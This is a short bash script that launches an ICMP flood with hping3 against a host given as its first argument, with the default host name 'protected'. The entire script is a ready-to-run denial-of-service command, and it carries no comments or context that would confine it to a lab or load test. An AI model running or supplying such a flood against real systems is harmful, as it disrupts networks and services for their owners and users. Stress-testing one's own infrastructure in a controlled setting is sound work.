#!/usr/bin/env bash
set -euo pipefail

TARGET_HOST=${1:-protected}

hping3 --icmp --flood "${TARGET_HOST}"
